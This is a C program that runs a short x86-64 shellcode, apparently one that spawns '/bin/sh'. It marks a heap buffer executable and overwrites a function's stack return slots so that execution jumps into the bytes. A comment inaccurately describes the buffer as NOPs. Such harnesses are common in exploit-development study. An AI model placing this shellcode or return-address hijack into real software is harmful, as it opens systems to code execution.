#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <malloc.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>

long long  *hold;
//char shellcode[] ="\x45\x5f\x1b\xeb\x89\x44\xd2\x31\xd6\x89\x44\xd2\x42\x8d\x41\x67\x44\x05\x0f\x3b\x41\x67\xd7\x89\x0f\x3c\x42\x8d\xff\xe0\xe8\x05\x62\x2f\xff\xff\x73\x2f\x6e\x69\x68\x00\x00";

char shellcode[] ="\xeb\x1b\x5f\x45\x31\xd2\x44\x89\xd2\x44\x89\xd6\x67\x41\x8d\x42\x3b\x0f\x05\x44\x89\xd7\x67\x41\x8d\x42\x3c\x0f\x05\xe8\xe0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00";
//Replace the above shellcode buffer of NOP operations with the hex code for you shell code.
//NOTE: Make sure it is null terminated, but otherwise has no NULL characters embedded.

void decoy(char *cx)

{
    long long *ret;
 
    hold= (long long *)&ret;
    (*hold)=(long long)cx;
    hold++;
    (*hold)=(long long)cx;
    hold++;
    (*hold)=(long long)cx;
    hold++;
    (*hold)=(long long)cx;
    hold++;
    (*hold)=(long long)cx;
    hold++;
    (*hold)=(long long)cx;

}

void main ()
{
    int pagesize;
    char *buf;
    
    pagesize = sysconf(_SC_PAGE_SIZE);
    posix_memalign(&buf, pagesize, strlen(shellcode)+10);

    strcpy(buf,shellcode);
  
    mprotect(buf, strlen(shellcode)+10, PROT_EXEC|PROT_WRITE|PROT_READ);
    decoy(buf);  
    return;  
}	    
